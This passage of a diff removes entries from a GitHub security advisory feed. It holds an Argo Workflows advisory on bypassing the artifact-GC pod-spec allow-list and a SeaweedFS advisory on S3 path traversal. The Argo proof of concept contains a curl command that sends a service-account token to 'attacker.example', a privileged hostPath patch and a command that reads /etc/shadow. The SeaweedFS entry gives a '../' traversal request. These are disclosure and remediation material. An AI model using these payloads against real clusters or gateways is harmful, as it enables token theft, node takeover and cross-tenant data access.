-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-13T14:16:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/argoproj/argo-workflows/v4] Argo Workflows: ArtifactGC.PodSpecPatch bypasses Strict/Secure template reference allow-list (Incomplete fix for CVE-2026-31892)]]></title>
-        <id>https://github.com/advisories/GHSA-48p8-g2fx-3wwm</id>
-        <link href="https://github.com/advisories/GHSA-48p8-g2fx-3wwm"/>
-        <updated>2026-08-13T14:16:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The allow-list fix for CVE-2026-31892 (GHSA-3wf5-g532-rcrr), and its follow-up coverage of <code>hostNetwork</code>/<code>securityContext</code>/<code>serviceAccountName</code> in GHSA-3775-99mw-8rp4, is incomplete. <code>workflow/util/merge.go</code> <code>ValidateUserOverrides</code> / <code>SanitizeUserWorkflowSpec</code> walk only the top-level fields of <code>WorkflowSpec</code> via reflection. <code>WorkflowSpec.ArtifactGC</code> is allow-listed because admins want users to configure artifact garbage collection. The struct behind that field, <code>WorkflowLevelArtifactGC</code>, has a <code>PodSpecPatch</code> sub-field whose contents flow unmodified into <code>util.ApplyPodSpecPatch</code> on the artifact-GC pod - the same sink the original fix closed for <code>WorkflowSpec.PodSpecPatch</code>. A user submitting a Workflow under <code>templateReferencing: Strict</code> or <code>Secure</code> can therefore still inject an arbitrary strategic merge patch into the artifact-GC pod (hostPath volumes, <code>privileged: true</code>, arbitrary image and command, <code>hostNetwork: true</code>), defeating the stated purpose of Strict/Secure reference mode.</p>
-<h3 id="details">Details</h3>
-<p>Locations in <code>main</code> at <code>4d9f021</code> (HEAD 2026-04-23):</p>
-<p>Allow-list and reflection scope - <code>workflow/util/merge.go:19-60</code>:</p>
-<pre><code class="language-go">var allowedUserOverrideFields = map[string]bool{
-    "Arguments":             true,
-    "Entrypoint":            true,
-    ...
-    "ArtifactGC":            true,   // &lt;-- allow-listed wholesale
-}
-
-func ValidateUserOverrides(userSpec *wfv1.WorkflowSpec) error {
-    v := reflect.ValueOf(userSpec).Elem()
-    t := v.Type()
-    zero := reflect.New(t).Elem()
-    for i := 0; i &lt; t.NumField(); i++ {
-        fieldName := t.Field(i).Name
-        if allowedUserOverrideFields[fieldName] {
-            continue                  // &lt;-- sub-fields are not walked
-        }
-        if !reflect.DeepEqual(v.Field(i).Interface(), zero.Field(i).Interface()) {
-            violations = append(violations, fieldName)
-        }
-    }
-    ...
-}
-</code></pre>
-<p>The allow-listed type - <code>pkg/apis/workflow/v1alpha1/workflow_types.go:1207-1217</code>:</p>
-<pre><code class="language-go">type WorkflowLevelArtifactGC struct {
-    ArtifactGC            `json:",inline"`
-    ForceFinalizerRemoval bool   `json:"forceFinalizerRemoval,omitempty"`
-    PodSpecPatch          string `json:"podSpecPatch,omitempty"`   // &lt;-- sink input
-}
-</code></pre>
-<p>The sink - <code>workflow/controller/artifact_gc.go:731-740</code> reads the user-controlled value:</p>
-<pre><code class="language-go">func (woc *wfOperationCtx) getArtifactGCPodInfo(artifact *wfv1.Artifact) podInfo {
-    info := podInfo{}
-    if woc.execWf.Spec.ArtifactGC != nil {
-        woc.updateArtifactGCPodInfo(&amp;woc.execWf.Spec.ArtifactGC.ArtifactGC, &amp;info)
-        info.podSpecPatch = woc.execWf.Spec.ArtifactGC.PodSpecPatch
-    }
-    ...
-}
-</code></pre>
-<p>And <code>workflow/controller/artifact_gc.go:518-525</code> feeds it unchanged to the same helper that CVE-2026-31892 closed for the top-level field:</p>
-<pre><code class="language-go">if info.podSpecPatch != "" {
-    patchedPodSpec, patchErr := util.ApplyPodSpecPatch(pod.Spec, info.podSpecPatch)
-    if patchErr != nil {
-        return nil, patchErr
-    }
-    pod.Spec = *patchedPodSpec
-}
-</code></pre>
-<p><code>util.ApplyPodSpecPatch</code> (<code>workflow/util/util.go:1560</code>) is a raw <code>strategicpatch.StrategicMergePatch</code> over the whole <code>apiv1.PodSpec</code> with no field-level restriction; it is the same primitive that was weaponized by the original CVE-2026-31892 against <code>WorkflowSpec.PodSpecPatch</code>. The pod it is applied to - built in <code>workflow/controller/artifact_gc.go</code> ~line 460-495 - has <code>AutomountServiceAccountToken: true</code> and a hardened <code>MinimalCtrSC()</code> security context that the patch fully overrides.</p>
-<p>The merge path is the one the fix already walks. <code>operator.go:#setStoredWfSpec</code> does <code>SanitizeUserWorkflowSpec(&amp;woc.wf.Spec)</code> before <code>JoinWorkflowSpec(userSpec, workflowTemplateSpec, wfDefaultSpec)</code>. <code>Sanitize</code> preserves <code>ArtifactGC</code> wholesale. <code>Join</code> uses <code>strategicpatch.StrategicMergePatch</code> with the user spec as the target, so the user's <code>artifactGC.podSpecPatch</code> value wins whenever it is non-empty.</p>
-<p>Precondition for the attack: the referenced <code>WorkflowTemplate</code> has at least one template with an output artifact. <code>workflow/controller/artifact_gc.go:79</code> <code>HasArtifactGC</code> iterates <code>execWf.Spec.Templates[*].Outputs.Artifacts[*]</code> and asks <code>GetArtifactGCStrategy(&amp;artifact)</code>, which falls back to <code>w.Spec.ArtifactGC.Strategy</code> when the per-artifact strategy is <code>Undefined</code> (<code>pkg/apis/workflow/v1alpha1/workflow_types.go:245</code>). The user supplies <code>spec.artifactGC.strategy: OnWorkflowCompletion</code> (in the allow-list) so the fallback is satisfied on any template that emits artifacts - the common case for real workloads.</p>
-<p>No validation sits between sanitize and sink:</p>
-<pre><code>grep -rn "ValidateArtifactGC\|validateArtifactGC\|ArtifactGC.*PodSpecPatch" --include="*.go" workflow/validate/
-# (no output)
-</code></pre>
-<p>The merge-package test file added with the fix (<code>workflow/util/merge_test.go</code> @ <code>4d9f021</code>) covers only <code>WorkflowSpec.PodSpecPatch</code>; <code>ArtifactGC.PodSpecPatch</code> is not exercised.</p>
-<h3 id="poc">PoC</h3>
-<p>Self-contained Go unit tests against the shipped <code>workflow/util</code> package at <code>main@4d9f021</code>. Drop either file into <code>workflow/util/</code> and run <code>go test</code>.</p>
-<p><code>poc/merge_artifactgc_poc_test.go</code>:</p>
-<pre><code class="language-go">package util
-
-import (
-    "testing"
-    "github.com/stretchr/testify/assert"
-    "github.com/stretchr/testify/require"
-    wfv1 "github.com/argoproj/argo-workflows/v4/pkg/apis/workflow/v1alpha1"
-)
-
-func TestPoC_ArtifactGCPodSpecPatchPassesAllowList(t *testing.T) {
-    attackerPatch := `{"containers":[{"name":"main","image":"attacker/evil:latest",` +
-        `"command":["sh","-c","curl attacker.example/exfil -d @/var/run/secrets/kubernetes.io/serviceaccount/token"]}],` +
-        `"hostNetwork":true}`
-    userSpec := &amp;wfv1.WorkflowSpec{
-        WorkflowTemplateRef: &amp;wfv1.WorkflowTemplateRef{Name: "safe-template"},
-        ArtifactGC: &amp;wfv1.WorkflowLevelArtifactGC{
-            ArtifactGC:   wfv1.ArtifactGC{Strategy: wfv1.ArtifactGCOnWorkflowCompletion},
-            PodSpecPatch: attackerPatch,
-        },
-    }
-
-    // Gate 1: allow-list. Expected to reject - does not.
-    require.NoError(t, ValidateUserOverrides(userSpec))
-
-    // Gate 2: sanitizer defense-in-depth. Expected to strip - does not.
-    sanitized := SanitizeUserWorkflowSpec(userSpec)
-    assert.Equal(t, attackerPatch, sanitized.ArtifactGC.PodSpecPatch)
-}
-</code></pre>
-<p><code>poc/artgc_sink_poc_test.go</code> demonstrates the same patch reaching <code>ApplyPodSpecPatch</code> and mutating the hardened pod baseline (switches image, sets <code>privileged: true</code>, sets <code>hostNetwork: true</code>, adds a <code>hostPath: /</code> volume):</p>
-<pre><code class="language-go">func TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch(t *testing.T) {
-    attackerPatch := `
-containers:
-- name: main
-  image: attacker/evil:latest
-  command: [sh, -c, "curl attacker.example/exfil -d @/var/run/secrets/kubernetes.io/serviceaccount/token"]
-  securityContext:
-    privileged: true
-    runAsUser: 0
-    runAsNonRoot: false
-    allowPrivilegeEscalation: true
-    capabilities: {drop: null, add: [SYS_ADMIN]}
-    readOnlyRootFilesystem: false
-hostNetwork: true
-volumes:
-- name: hostroot
-  hostPath: {path: /}
-`
-    userSpec := &amp;wfv1.WorkflowSpec{
-        WorkflowTemplateRef: &amp;wfv1.WorkflowTemplateRef{Name: "safe-template"},
-        ArtifactGC: &amp;wfv1.WorkflowLevelArtifactGC{
-            ArtifactGC:   wfv1.ArtifactGC{Strategy: wfv1.ArtifactGCOnWorkflowCompletion},
-            PodSpecPatch: attackerPatch,
-        },
-    }
-    require.NoError(t, ValidateUserOverrides(userSpec))
-    sanitized := SanitizeUserWorkflowSpec(userSpec)
-
-    // Baseline built exactly like workflow/controller/artifact_gc.go:createArtifactGCPod.
-    basePod := apiv1.PodSpec{ /* AutomountSAToken=true, MinimalCtrSC, limits, etc. */ }
-
-    patched, err := ApplyPodSpecPatch(basePod, sanitized.ArtifactGC.PodSpecPatch)
-    require.NoError(t, err)
-
-    assert.Equal(t, "attacker/evil:latest",     patched.Containers[0].Image)
-    assert.Equal(t, true, *patched.Containers[0].SecurityContext.Privileged)
-    assert.Equal(t, true, patched.HostNetwork)
-    assert.Equal(t, "/",  patched.Volumes[0].HostPath.Path)
-}
-</code></pre>
-<p>Run:</p>
-<pre><code>go test -v -run "TestPoC_ArtifactGC" ./workflow/util/
-</code></pre>
-<p>Captured output:</p>
-<pre><code>=== RUN   TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch
---- PASS: TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch (0.00s)
-=== RUN   TestPoC_ArtifactGCPodSpecPatchPassesAllowList
---- PASS: TestPoC_ArtifactGCPodSpecPatchPassesAllowList (0.00s)
-PASS
-ok  	github.com/argoproj/argo-workflows/v4/workflow/util	0.036s
-</code></pre>
-<p>End-to-end Workflow manifest (for a live cluster reproduction by maintainers):</p>
-<pre><code class="language-yaml">apiVersion: argoproj.io/v1alpha1
-kind: WorkflowTemplate
-metadata: {name: safe-template}
-spec:
-  entrypoint: main
-  templates:
-    - name: main
-      container: {image: argoexec:latest, command: [echo, hello]}
-      outputs:
-        artifacts:
-          - {name: artifact, path: /tmp/artifact}
----
-apiVersion: argoproj.io/v1alpha1
-kind: Workflow
-metadata: {generateName: bypass-}
-spec:
-  workflowTemplateRef: {name: safe-template}
-  artifactGC:
-    strategy: OnWorkflowCompletion
-    podSpecPatch: |
-      containers:
-      - name: main
-        image: attacker/evil:latest
-        command: [sh, -c, "while true; do cat /host/etc/shadow; sleep 3600; done"]
-      hostNetwork: true
-      volumes:
-      - name: hostroot
-        hostPath: {path: /}
-</code></pre>
-<p>Controller config for the test cluster:</p>
-<pre><code class="language-yaml">workflowRestrictions:
-  templateReferencing: Strict
-</code></pre>
-<p>With the fix for CVE-2026-31892 in place, submitting this Workflow is expected to fail validation (the fix explicitly advertises that Strict mode restricts users to admin-approved templates). It is accepted, and the artifact-GC pod that the controller creates on workflow completion picks up the attacker's image, command, hostPath mount, and hostNetwork.</p>
-<h3 id="impact">Impact</h3>
-<p>Under <code>templateReferencing: Strict</code> or <code>Secure</code>, the purpose of the allow-list introduced in <code>4d9f021</code> is to make <code>workflowTemplateRef</code> the sole mechanism by which a user can request Workflow execution and to block spec fields that let the user override the admin's container configuration. <code>ArtifactGC.PodSpecPatch</code> is exactly such an override: a strategic merge patch applied by the controller to the artifact-GC pod, with no schema-level restriction on what it may change. Any template whose authors have declared output artifacts - i.e., any workflow that produces data, which is the motivating Argo use case - gives the submitter a path to:</p>
-<ul>
-<li>run an attacker-chosen image as a container in the workflow's namespace, with <code>AutomountServiceAccountToken: true</code>, i.e. holding the artifact-GC pod's service-account token,</li>
-<li>bypass <code>common.MinimalCtrSC()</code> / <code>common.MinimalPodSC()</code> by setting <code>privileged: true</code>, <code>allowPrivilegeEscalation: true</code>, <code>runAsUser: 0</code>, <code>readOnlyRootFilesystem: false</code>, <code>capabilities.add: [SYS_ADMIN]</code>,</li>
-<li>mount <code>hostPath: /</code> into the pod (reads and writes to the kubelet's node filesystem, subject only to any cluster-level PSA/PSP the operator has enforced independently),</li>
-<li>enable <code>hostNetwork: true</code> (equivalent to being on the node's network for the lifetime of the pod).</li>
-</ul>
-<p>This is the same class of impact the original CVE-2026-31892 (CVSS 8.9 - critical in the Strict-mode threat model) was rated for, against an identical sink. The fix blocks the top-level <code>PodSpecPatch</code> field but leaves a second call site with the same semantics reachable through an allow-listed sub-field.</p>
-<p>A minimal fix is either (a) add a sub-field pass to <code>ValidateUserOverrides</code>/<code>SanitizeUserWorkflowSpec</code> that rejects/empties <code>ArtifactGC.PodSpecPatch</code> when <code>MustUseReference()</code> is true, or (b) gate the <code>if info.podSpecPatch != ""</code> branch in <code>createArtifactGCPod</code> on the same <code>WorkflowRestrictions.MustUseReference()</code> check so the sink itself refuses user-supplied patches in Strict/Secure mode.</p>
-<p>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/argoproj/argo-workflows/security/advisories/GHSA-48p8-g2fx-3wwm">https://github.com/argoproj/argo-workflows/security/advisories/GHSA-48p8-g2fx-3wwm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54526">https://nvd.nist.gov/vuln/detail/CVE-2026-54526</a></li>
-<li><a href="https://github.com/argoproj/argo-workflows/commit/277e9cef0ad16d7eaaab253573d0695951a65dbd">https://github.com/argoproj/argo-workflows/commit/277e9cef0ad16d7eaaab253573d0695951a65dbd</a></li>
-<li><a href="https://github.com/argoproj/argo-workflows/commit/358cc3968c8f06f1be0967e41df191088db0b662">https://github.com/argoproj/argo-workflows/commit/358cc3968c8f06f1be0967e41df191088db0b662</a></li>
-<li><a href="https://github.com/argoproj/argo-workflows/releases/tag/v3.7.15">https://github.com/argoproj/argo-workflows/releases/tag/v3.7.15</a></li>
-<li><a href="https://github.com/argoproj/argo-workflows/releases/tag/v4.0.6">https://github.com/argoproj/argo-workflows/releases/tag/v4.0.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-48p8-g2fx-3wwm">https://github.com/advisories/GHSA-48p8-g2fx-3wwm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-48p8-g2fx-3wwm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-13T14:16:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/seaweedfs/seaweedfs] SeaweedFS: Path traversal in the S3 and Iceberg REST gateways allows cross-bucket access]]></title>
-        <id>https://github.com/advisories/GHSA-w62w-66v9-vvgv</id>
-        <link href="https://github.com/advisories/GHSA-w62w-66v9-vvgv"/>
-        <updated>2026-08-12T19:19:55.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The S3 API gateway and the Iceberg REST catalog gateway construct their routers with <code>mux.NewRouter().SkipClean(true)</code>. With path cleaning disabled, a <code>..</code> segment inside the URL survives routing, so a request such as:</p>
-<pre><code>GET /bucket-A/../evil-bucket/key
-</code></pre>
-<p>is matched as <code>bucket=bucket-A</code>, <code>object=../evil-bucket/key</code>. The captured object key is then joined into a filer path with <code>util.JoinPath</code> (S3) / <code>path.Join</code> (Iceberg), which collapse the <code>..</code> server-side, so the actual read or write lands in <code>evil-bucket</code>.</p>
-<p>The captured path variables were never validated for traversal segments before reaching the handlers, so bucket isolation depended on downstream checks rather than on the path itself.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>With authentication disabled</strong> (<code>enableAuth=false</code>): direct cross-bucket read and write. An object key containing <code>..</code> resolves to and operates on a different bucket than the one named in the request path.</li>
-<li><strong>With authentication enabled</strong> (<code>enableAuth=true</code>): an authorization confused-deputy. IAM evaluates the policy against the mux <code>{bucket}</code> variable (<code>bucket-A</code>) in <code>iam.authRequestWithAuthType</code>, while the I/O is performed against the traversed target (<code>evil-bucket</code>). A principal authorized for one bucket can therefore reach objects in another bucket it has no grant for. This breaks tenant isolation.</li>
-</ul>
-<p>The same class of traversal applies to the Iceberg REST catalog's <code>{prefix}</code>, <code>{namespace}</code>, and <code>{table}</code> path variables.</p>
-<p><code>%2e%2e</code>-encoded and <code>..\</code> (backslash) variants are equivalent, because gorilla/mux URL-decodes captured variables and <code>NormalizeObjectKey</code> folds <code>\</code> to <code>/</code> before the path is used.</p>
-<h2 id="affected-components">Affected components</h2>
-<ul>
-<li>S3 API gateway (<code>weed s3</code>, and the S3 endpoint embedded in <code>weed server</code>)</li>
-<li>Iceberg REST catalog gateway</li>
-</ul>
-<h2 id="affected-versions">Affected versions</h2>
-<p>All releases prior to <strong>4.30</strong>.</p>
-<h2 id="patched-version">Patched version</h2>
-<p><strong>4.30</strong> and later.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<p>With a bucket <code>evil-bucket</code> containing <code>secret.txt</code>, and a caller that only has (or needs no) access to <code>bucket-A</code>:</p>
-<pre><code>GET /bucket-A/../evil-bucket/secret.txt HTTP/1.1
-Host: &lt;gateway&gt;
-</code></pre>
-<p>The response returns the contents of <code>evil-bucket/secret.txt</code>. The encoded form <code>GET /bucket-A/%2e%2e/evil-bucket/secret.txt</code> behaves identically.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Upgrade to SeaweedFS <strong>4.30</strong> or later. The fix adds a validation middleware to both gateway routers that rejects any captured path variable containing a <code>.</code> or <code>..</code> segment, a NUL byte, an embedded slash/backslash in single-segment slots, or an empty captured value, before any handler runs.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>For deployments that cannot upgrade immediately, place a reverse proxy in front of the gateway that normalizes the request path and rejects requests whose path contains <code>..</code>, <code>%2e%2e</code>, or backslash sequences. Note that disabling auth removes the only remaining barrier, so do not rely on <code>enableAuth=false</code> deployments being protected by anything.</p>
-<h2 id="resources">Resources</h2>
-<ul>
-<li>Fix: <a href="https://github.com/seaweedfs/seaweedfs/pull/9687">https://github.com/seaweedfs/seaweedfs/pull/9687</a> (commit <code>dd1b428</code>)</li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>Reported responsibly by <strong>Denis Abashkin</strong> (<a href="https://github.com/dadbravo">@dadbravo</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-w62w-66v9-vvgv">https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-w62w-66v9-vvgv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54917">https://nvd.nist.gov/vuln/detail/CVE-2026-54917</a></li>
-<li><a href="https://github.com/seaweedfs/seaweedfs/pull/9687">https://github.com/seaweedfs/seaweedfs/pull/9687</a></li>
-<li><a href="https://github.com/seaweedfs/seaweedfs/commit/dd1b4287899eed3dfd73c2f3b1de001996fda229">https://github.com/seaweedfs/seaweedfs/commit/dd1b4287899eed3dfd73c2f3b1de001996fda229</a></li>
-<li><a href="https://github.com/advisories/GHSA-w62w-66v9-vvgv">https://github.com/advisories/GHSA-w62w-66v9-vvgv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w62w-66v9-vvgv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-12T19:19:54.000Z</published>
     </entry>
 </feed>
